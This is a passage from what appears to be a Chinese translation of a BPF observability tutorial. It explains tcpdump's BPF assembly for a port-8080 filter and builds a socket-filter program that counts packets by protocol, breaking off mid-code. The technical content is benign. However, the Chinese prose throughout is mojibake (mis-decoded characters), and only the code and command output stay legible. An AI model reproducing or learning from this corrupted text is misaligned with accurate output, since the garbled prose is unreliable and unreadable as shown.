è½½BPFç¨‹åºæ¥è¿‡æ»¤æ•°æ®åŒ…ã€‚å¹¸è¿çš„æ˜¯ï¼Œé€šè¿‡å°†<code>-d</code>æ ‡å¿—ä¼ é€’ç»™<code>tcpdump</code>ï¼Œä½ å¯ä»¥è½¬å‚¨åœ¨ä½¿ç”¨æŒ‡å®šè¿‡æ»¤å™¨æ—¶å°†åŠ è½½çš„BPFæŒ‡ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# tcpdump  -d  'ip and tcp port 8080'</span><br></pre></td></tr></table></figure><p>è¯¥è¿‡æ»¤å™¨ä¸ä¸Šä¸€ä¸ªç¤ºä¾‹ä¸­ä½¿ç”¨çš„è¿‡æ»¤å™¨ç›¸åŒï¼Œä½†ç”±äº<code>-d</code>æ ‡å¿—ï¼Œç°åœ¨è¾“å‡ºæ˜¯ä¸€ç»„BPFæ±‡ç¼–æŒ‡ä»¤ã€‚</p><p>è¾“å‡ºå¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(000) ldh      [12]</span><br><span class="line">(001) jeq      #0x800           jt 2jf 12</span><br><span class="line">(002) ldb      [23]</span><br><span class="line">(003) jeq      #0x6             jt 4jf 12</span><br><span class="line">(004) ldh      [20]</span><br><span class="line">(005) jset     #0x1fff          jt 12jf 6</span><br><span class="line">(006) ldxb     4*([14]&amp;0xf)</span><br><span class="line">(007) ldh      [x + 14]</span><br><span class="line">(008) jeq      #0x1f90          jt 11jf 9</span><br><span class="line">(009) ldh      [x + 16]</span><br><span class="line">(010) jeq      #0x1f90          jt 11jf 12</span><br><span class="line">(011) ret      #262144</span><br><span class="line">(012) ret      #0</span><br></pre></td></tr></table></figure><p>åˆ†æå¦‚ä¸‹</p><p>ldh [12]ï¼šåœ¨åç§»é‡12å¤„ä»ç´¯åŠ å™¨åŠ è½½(ld)ä¸€ä¸ª(h)åŠå­—ï¼ˆ16 ä½ï¼‰ï¼Œè¿™æ˜¯<code>Ethertype</code>å­—æ®µï¼Œç¬¬äºŒå±‚ä»¥å¤ªç½‘å¸§ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="/2022/05/29/ä½¿ç”¨BPFçš„Linuxå¯è§‚æµ‹æ€§-ä¸‹ç¯‡-ç¿»è¯‘/1.png" alt="1"></p><p>jeq #0x800 jt 2 jf 12ï¼šå¦‚æœ (eq) ç›¸ç­‰åˆ™è·³è½¬(j) ï¼›æ£€æŸ¥ä¸Šä¸€æ¡æŒ‡ä»¤ä¸­çš„<code>Ethertype</code>å€¼æ˜¯å¦ç­‰äº<code>0x800</code>ï¼ˆè¿™æ˜¯ IPv4 çš„æ ‡è¯†ç¬¦ï¼‰ï¼Œç„¶åä½¿ç”¨è·³è½¬ç›®æ ‡ï¼Œå¦‚æœä¸ºçœŸï¼ˆjtï¼‰åˆ™ä¸º2ï¼Œå¦‚æœä¸ºå‡ï¼ˆjfï¼‰åˆ™ä¸º12ï¼Œå› æ­¤è¿™å°†ç»§ç»­åˆ°ä¸‹ä¸€ä¸ªå¦‚æœInternetåè®®æ˜¯IPv4çš„æŒ‡ä»¤â€”â€”å¦åˆ™å®ƒå°†è·³è½¬åˆ°æœ«å°¾å¹¶è¿”å›é›¶ã€‚</p><p>ldb [23]ï¼šåŠ è½½å­—èŠ‚(ldb)ï¼Œå°†ä»IPå¸§ä¸­åŠ è½½æ›´é«˜å±‚åè®®å­—æ®µï¼Œè¯¥å­—æ®µå¯åœ¨åç§»é‡23å¤„æ‰¾åˆ°â€”â€”åç§»é‡23æ¥è‡ªä»¥å¤ªç½‘ç¬¬2å±‚å¸§ä¸­å¤´çš„14ä¸ªå­—èŠ‚çš„æ·»åŠ åŠ ä¸Šåè®®åœ¨IPv4å¤´ä¸­çš„ä½ç½®ï¼Œå³ç¬¬9ä¸ªï¼Œå› æ­¤14+9=23ã€‚</p><p>jeq #0x6 jt 4 jf 12ï¼šå¦‚æœç›¸ç­‰ï¼Œå†è·³ä¸€æ¬¡ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ£€æŸ¥ä¹‹å‰æå–çš„åè®®æ˜¯<code>0x6</code>ï¼Œå³TCPã€‚å¦‚æœæ˜¯ï¼Œæˆ‘ä»¬è·³åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤(4)æˆ–è€…æˆ‘ä»¬èµ°åˆ°æœ€å(12)â€”â€”å¦‚æœä¸æ˜¯ï¼Œæˆ‘ä»¬ä¸¢å¼ƒæ•°æ®åŒ…ã€‚</p><p>ldh [20]ï¼šè¿™æ˜¯å¦ä¸€ä¸ªåŠ è½½åŠå­—æŒ‡ä»¤â€”â€”åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒæ˜¯ä»IPv4å¤´åŠ è½½æ•°æ®åŒ…åç§»é‡+åˆ†ç‰‡åç§»é‡çš„å€¼ã€‚</p><p>jset #0x1fff jt 12 6ï¼šå¦‚æœæˆ‘ä»¬åœ¨åˆ†ç‰‡åç§»ä¸­æ‰¾åˆ°çš„ä»»ä½•æ•°æ®ä¸ºçœŸï¼Œåˆ™æ­¤<code>jset</code>æŒ‡ä»¤å°†è·³è½¬åˆ°12â€”â€”å¦åˆ™ï¼Œè·³è½¬åˆ°6ï¼Œå³ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚æŒ‡ä»¤<code>0x1fff</code>ä¹‹åçš„åç§»é‡å‘Šè¯‰<code>jset</code>æŒ‡ä»¤åªæŸ¥çœ‹æœ€å13ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚ï¼ˆæ‰©å±•ä¸º 0001 1111 1111 1111ï¼‰</p><p>ldxb 4*([14]&amp;0xf)ï¼šå°†(b)åŠ è½½(ld)åˆ°xä¸­ã€‚è¯¥æŒ‡ä»¤ä¼šå°†IPæ ‡å¤´é•¿åº¦çš„å€¼åŠ è½½åˆ°xä¸­ã€‚</p><p>ldh [x+14]ï¼šå¦ä¸€ä¸ªåŠ è½½åŠå­—æŒ‡ä»¤å°†è·å–åç§»é‡(x + 14)å¤„çš„å€¼ï¼ŒIPæ ‡å¤´é•¿åº¦+14ï¼Œè¿™æ˜¯æ•°æ®åŒ…ä¸­æºç«¯å£çš„ä½ç½®ã€‚</p><p>jeq #0x1f90 jt 11 jf 9ï¼šå¦‚æœ(x + 14)å¤„çš„å€¼ç­‰äº<code>0x1f90</code>ï¼ˆåè¿›åˆ¶çš„ 8080ï¼‰ï¼Œè¿™æ„å‘³ç€æºç«¯å£å°†æ˜¯<code>8080</code>ï¼Œç»§ç»­11æˆ–ç»§ç»­æ£€æŸ¥ç›®æ ‡ç«¯å£æ˜¯å¦åœ¨ç«¯å£8080ä¸Šï¼Œå¦‚æœæ˜¯é”™è¯¯çš„ï¼Œç»§ç»­9 .</p><p>ldh [x + 16]ï¼šè¿™æ˜¯å¦ä¸€ä¸ªåŠ è½½åŠå­—æŒ‡ä»¤ï¼Œå®ƒå°†è·å–åç§»é‡(x + 16)å¤„çš„å€¼ï¼Œè¿™æ˜¯æ•°æ®åŒ…ä¸­ç›®æ ‡ç«¯å£çš„ä½ç½®ã€‚</p><p>jeq #0x1f90 jt 11 jf 12ï¼šè¿™é‡Œå¦‚æœç›¸ç­‰å†è·³è½¬ä¸€æ¬¡ï¼Œè¿™æ¬¡ç”¨æ¥æ£€æŸ¥ç›®çš„åœ°æ˜¯å¦ä¸º<code>8080</code>ï¼Œè·³è½¬åˆ°11ï¼›å¦‚æœä¸æ˜¯ï¼Œè½¬è‡³12å¹¶ä¸¢å¼ƒè¯¥æ•°æ®åŒ…ã€‚</p><p>ret #262144ï¼šåˆ°è¾¾æ­¤æŒ‡ä»¤æ—¶ï¼Œä¼šæ‰¾åˆ°åŒ¹é…é¡¹ï¼Œä»è€Œè¿”å›åŒ¹é…çš„å¿«ç…§é•¿åº¦ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œæ­¤å€¼ä¸º262144å­—èŠ‚ã€‚ å¯ä»¥ä½¿ç”¨<code>tcpdump</code>ä¸­çš„<code>-s</code>å‚æ•°å¯¹å…¶è¿›è¡Œè°ƒæ•´ã€‚</p><p>å¦‚æœåªè€ƒè™‘ä»¥<code>8080</code>ä½œä¸ºç›®æ ‡çš„æ•°æ®åŒ…ï¼Œè€Œä¸æ˜¯ä½œä¸ºæºçš„æ•°æ®åŒ…ï¼Œ<code>tcpdump</code>ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# tcpdump -d 'ip and tcp dst port 8080'</span><br><span class="line">(000) ldh      [12]</span><br><span class="line">(001) jeq      #0x800           jt 2jf 10</span><br><span class="line">(002) ldb      [23]</span><br><span class="line">(003) jeq      #0x6             jt 4jf 10</span><br><span class="line">(004) ldh      [20]</span><br><span class="line">(005) jset     #0x1fff          jt 10jf 6</span><br><span class="line">(006) ldxb     4*([14]&amp;0xf)</span><br><span class="line">(007) ldh      [x + 16]</span><br><span class="line">(008) jeq      #0x1f90          jt 9jf 10</span><br><span class="line">(009) ret      #262144</span><br><span class="line">(010) ret      #0</span><br></pre></td></tr></table></figure><p>é™¤äº†åƒæˆ‘ä»¬é‚£æ ·åˆ†æä»<code>tcpdump</code>ç”Ÿæˆçš„ç¨‹åºé›†ä¹‹å¤–ï¼Œä½ å¯èƒ½è¿˜æƒ³ç¼–å†™è‡ªå·±çš„ä»£ç æ¥è¿‡æ»¤ç½‘ç»œæ•°æ®åŒ…ã€‚äº‹å®è¯æ˜ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæœ€å¤§çš„æŒ‘æˆ˜å°†æ˜¯å®é™…è°ƒè¯•ä»£ç çš„æ‰§è¡Œä»¥ç¡®ä¿å®ƒç¬¦åˆæˆ‘ä»¬çš„æœŸæœ›ï¼› åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåœ¨å†…æ ¸æºä»£ç æ ‘ä¸­ï¼Œ<code>tools/bpf</code>ä¸­æœ‰ä¸€ä¸ªåä¸º<code>bpf_dbg.c</code>çš„å·¥å…·ï¼Œå®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªè°ƒè¯•å™¨ï¼Œå…è®¸åŠ è½½ç¨‹åºå’Œ<code>pcap</code>æ–‡ä»¶ä»¥é€æ­¥æµ‹è¯•æ‰§è¡Œã€‚</p><p><code>tcpdump</code>ä¹Ÿå¯ä»¥ç›´æ¥ä»<code>.pcap</code>æ–‡ä»¶ä¸­è¯»å–ï¼Œå¹¶å¯¹å…¶åº”ç”¨BPFè¿‡æ»¤å™¨ã€‚</p><h4 id="åŸå§‹å¥—æ¥å­—çš„æ•°æ®åŒ…è¿‡æ»¤"><a href="#åŸå§‹å¥—æ¥å­—çš„æ•°æ®åŒ…è¿‡æ»¤" class="headerlink" title="åŸå§‹å¥—æ¥å­—çš„æ•°æ®åŒ…è¿‡æ»¤"></a>åŸå§‹å¥—æ¥å­—çš„æ•°æ®åŒ…è¿‡æ»¤</h4><p><code>BPF_PROG_TYPE_SOCKET_FILTER</code>ç¨‹åºç±»å‹å…è®¸ä½ å°†BPFç¨‹åºé™„åŠ åˆ°å¥—æ¥å­—ã€‚å®ƒæ¥æ”¶åˆ°çš„æ‰€æœ‰æ•°æ®åŒ…éƒ½ä¼šä»¥<code>sk_buff</code>ç»“æ„ä½“çš„å½¢å¼ä¼ é€’ç»™ç¨‹åºï¼Œç„¶åç¨‹åºå¯ä»¥å†³å®šæ˜¯ä¸¢å¼ƒè¿˜æ˜¯å…è®¸ã€‚è¿™ç§ç¨‹åºè¿˜å…·æœ‰è®¿é—®å’Œå¤„ç†æ˜ å°„çš„èƒ½åŠ›ã€‚</p><p>è®©æˆ‘ä»¬çœ‹ä¸€ä¸ªä¾‹å­ï¼Œçœ‹çœ‹å¦‚ä½•ä½¿ç”¨è¿™ç§BPFç¨‹åºã€‚</p><p>æˆ‘ä»¬ç¤ºä¾‹ç¨‹åºçš„ç›®çš„æ˜¯è®¡ç®—åœ¨è§‚å¯Ÿä¸‹æµç»æ¥å£çš„TCPã€UDPå’Œäº’è”ç½‘æ§åˆ¶æ¶ˆæ¯åè®®(ICMP)æ•°æ®åŒ…çš„æ•°é‡ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>å¯ä»¥çœ‹åˆ°æ•°æ®åŒ…æµåŠ¨çš„BPFç¨‹åº</li><li>åŠ è½½ç¨‹åºå¹¶å°†å…¶é™„åŠ åˆ°ç½‘ç»œæ¥å£çš„ä»£ç </li><li>ç”¨äºç¼–è¯‘ç¨‹åºå¹¶å¯åŠ¨åŠ è½½ç¨‹åºçš„è„šæœ¬</li></ul><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸¤ç§æ–¹å¼ç¼–å†™BPFç¨‹åºï¼šä½œä¸ºCä»£ç ç„¶åç¼–è¯‘ä¸ºELFæ–‡ä»¶ï¼Œæˆ–è€…ç›´æ¥ä½œä¸ºBPFç¨‹åºé›†ã€‚å¯¹äºè¿™ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨Cä»£ç æ¥å±•ç¤ºæ›´é«˜å±‚æ¬¡çš„æŠ½è±¡ä»¥åŠå¦‚ä½•ä½¿ç”¨Clangæ¥ç¼–è¯‘ç¨‹åºã€‚</p><h5 id="BPFç¨‹åº"><a href="#BPFç¨‹åº" class="headerlink" title="BPFç¨‹åº"></a>BPFç¨‹åº</h5><p>è¿™é‡ŒBPFç¨‹åºçš„ä¸»è¦èŒè´£æ˜¯è®¿é—®å®ƒæ¥æ”¶åˆ°çš„æ•°æ®åŒ…ï¼›æ£€æŸ¥å…¶åè®®æ˜¯TCPã€UDPè¿˜æ˜¯ICMPï¼Œç„¶ååœ¨æ‰¾åˆ°çš„åè®®çš„ç‰¹å®šé”®ä¸Šå¢åŠ æ˜ å°„æ•°ç»„ä¸Šçš„è®¡æ•°ã€‚</p><p>å¯¹äºè¿™ä¸ªç¨‹åºï¼Œæˆ‘ä»¬å°†åˆ©ç”¨ä½äºå†…æ ¸æºç ä¸­<code>samples/bpf/bpf_load.c</code>ä¸­çš„å¸®åŠ©ç¨‹åºè§£æELFæ–‡ä»¶çš„åŠ è½½æœºåˆ¶ã€‚ åŠ è½½å‡½æ•°<code>load_bpf_file</code>èƒ½å¤Ÿè¯†åˆ«æŸäº›ç‰¹å®šçš„ELFèŠ‚å¤´ï¼Œå¹¶å°†å®ƒä»¬ä¸ç›¸åº”çš„ç¨‹åºç±»å‹ç›¸å…³è”ã€‚ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> is_socket = <span class="built_in">strncmp</span>(event, <span class="string">"socket"</span>, <span class="number">6</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_kprobe = <span class="built_in">strncmp</span>(event, <span class="string">"kprobe/"</span>, <span class="number">7</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_kretprobe = <span class="built_in">strncmp</span>(event, <span class="string">"kretprobe/"</span>, <span class="number">10</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_tracepoint = <span class="built_in">strncmp</span>(event, <span class="string">"tracepoint/"</span>, <span class="number">11</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_raw_tracepoint = <span class="built_in">strncmp</span>(event, <span class="string">"raw_tracepoint/"</span>, <span class="number">15</span>) == <span class="number">0</span>; </span><br><span class="line"><span class="keyword">bool</span> is_xdp = <span class="built_in">strncmp</span>(event, <span class="string">"xdp"</span>, <span class="number">3</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_perf_event = <span class="built_in">strncmp</span>(event, <span class="string">"perf_event"</span>, <span class="number">10</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_cgroup_skb = <span class="built_in">strncmp</span>(event, <span class="string">"cgroup/skb"</span>, <span class="number">10</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_cgroup_sk = <span class="built_in">strncmp</span>(event, <span class="string">"cgroup/sock"</span>, <span class="number">11</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_sockops = <span class="built_in">strncmp</span>(event, <span class="string">"sockops"</span>, <span class="number">7</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_sk_skb = <span class="built_in">strncmp</span>(event, <span class="string">"sk_skb"</span>, <span class="number">6</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_sk_msg = <span class="built_in">strncmp</span>(event, <span class="string">"sk_msg"</span>, <span class="number">6</span>) == <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>ä»£ç æ‰€åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯åœ¨èŠ‚å¤´å’Œå†…éƒ¨å˜é‡ä¹‹é—´åˆ›å»ºå…³è”â€”â€”å°±åƒ<code>SEC(&quot;socket&quot;)</code>ä¸€æ ·ï¼Œæˆ‘ä»¬æœ€ç»ˆä¼šå¾—åˆ°<code>bool is_socket=true</code></p><p>ä¹‹ååœ¨åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†ä¸€ç»„ifæŒ‡ä»¤ï¼Œå®ƒä»¬åˆ›å»ºäº†headerå’Œå®é™…<code>prog_type</code>ä¹‹é—´çš„å…³è”ï¼Œå› æ­¤å¯¹äº<code>is_socket</code>ï¼Œæˆ‘ä»¬æœ€ç»ˆå¾—åˆ°<code>BPF_PROG_TYPE_SOCKET_FILTER</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_socket) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_SOCKET_FILTER;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_kprobe || is_kretprobe) &#123; </span><br><span class="line">  prog_type = BPF_PROG_TYPE_KPROBE;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_tracepoint) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_TRACEPOINT;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_raw_tracepoint) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_RAW_TRACEPOINT;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_xdp) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_XDP;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_perf_event) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_PERF_EVENT;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_cgroup_skb) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_CGROUP_SKB;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_cgroup_sk) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_CGROUP_SOCK;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_sockops) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_SOCK_OPS;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_sk_skb) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_SK_SKB;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_sk_msg) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_SK_MSG;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Unknown event '%s'\n"</span>, event); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬æƒ³ç¼–å†™ä¸€ä¸ª<code>BPF_PROG_TYPE_SOCKET_FILTER</code>ç¨‹åºï¼Œæˆ‘ä»¬éœ€è¦æŒ‡å®šä¸€ä¸ª<code>SEC(&quot;socket&quot;)</code>ä½œä¸ºæˆ‘ä»¬å‡½æ•°çš„ELFå¤´ï¼Œå®ƒå°†ä½œä¸ºBPFç¨‹åºçš„å…¥å£ç‚¹ã€‚</p><p>æ­£å¦‚ä»è¯¥åˆ—è¡¨ä¸­çœ‹åˆ°çš„é‚£æ ·ï¼Œæœ‰å¤šç§ä¸å¥—æ¥å­—å’Œä¸€èˆ¬ç½‘ç»œæ“ä½œç›¸å…³çš„ç¨‹åºç±»å‹ã€‚åœ¨æœ¬ç« ä¸­ï¼Œæˆ‘ä»¬å°†å±•ç¤º<code>BPF_PROG_TYPE_SOCKET_FILTER</code>çš„ç¤ºä¾‹ï¼›æ­¤å¤–ï¼Œåé¢æˆ‘ä»¬å°†è®¨è®ºç¨‹åºç±»å‹ä¸º <code>BPF_PROG_TYPE_XDP</code>çš„XDPç¨‹åºã€‚</p><p>æˆ‘ä»¬æƒ³è¦å­˜å‚¨é‡åˆ°çš„æ¯ä¸ªåè®®çš„æ•°æ®åŒ…è®¡æ•°ï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ªé”®/å€¼æ˜ å°„ï¼Œå…¶ä¸­åè®®æ˜¯é”®ï¼Œæ•°æ®åŒ…è®¡æ•°ä¸ºå€¼ã€‚ä¸ºæ­¤å¯ä»¥ä½¿ç”¨<code>BPF_MAP_TYPE_ARRAY</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> countmap </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">.key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .max_entries = <span class="number">256</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¯¥æ˜ å°„æ˜¯ä½¿ç”¨<code>bpf_map_def</code>ç»“æ„å®šä¹‰çš„ï¼Œå®ƒå°†è¢«å‘½åä¸º<code>countmap</code>ä»¥ä¾›ç¨‹åºä¸­å¼•ç”¨ã€‚</p><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€äº›ä»£ç æ¥å®é™…è®¡ç®—æ•°æ®åŒ…ã€‚<code>BPF_PROG_TYPE_SOCKET_FILTER</code>ç±»å‹çš„ç¨‹åºæ˜¯æˆ‘ä»¬çš„é€‰æ‹©ä¹‹ä¸€ï¼Œå› ä¸ºé€šè¿‡ä½¿ç”¨è¿™æ ·çš„ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ‰€æœ‰æµç»æ¥å£çš„æ•°æ®åŒ…ã€‚å› æ­¤æˆ‘ä»¬ä½¿ç”¨<code>SEC(&quot;socket&quot;)</code>å°†ç¨‹åºé™„åŠ åˆ°æ­£ç¡®çš„å¤´éƒ¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"socket"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket_prog</span><span class="params">(struct __sk_buff *skb)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> proto = load_byte(skb, ETH_HLEN + offsetof(struct iphdr, protocol)); <span class="keyword">int</span> one=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> *el = bpf_map_lookup_elem(&amp;countmap, &amp;proto);</span><br><span class="line"><span class="keyword">if</span> (el) &#123;</span><br><span class="line">(*el)++; </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">el = &amp;one; </span><br><span class="line">  &#125;</span><br><span class="line">  bpf_map_update_elem(&amp;countmap, &amp;proto, el, BPF_ANY);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ELFå¤´é™„åŠ ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>load_byte</code>å‡½æ•°ä»<code>sk_buff</code>ç»“æ„ä¸­æå–åè®®éƒ¨åˆ†ã€‚ç„¶åä½¿ç”¨åè®®IDä½œä¸ºé”®æ¥æ‰§è¡Œ<code>bpf_map_lookup_elem</code>æ“ä½œä»¥ä»è®¡æ•°æ˜ å°„ä¸­æå–å½“å‰è®¡æ•°å™¨å€¼ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥å°†å…¶é€’å¢ï¼Œå¦‚æœå®ƒæ˜¯ç¬¬ä¸€ä¸ªæ•°æ®åŒ…ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶è®¾ç½®ä¸º1ã€‚ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>bpf_map_update_elem</code>ç”¨å¢åŠ çš„å€¼æ›´æ–°æ˜ å°„ã€‚</p><p>å®Œæ•´çš„<code>bpf_program.c</code>ç¨‹åºå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span 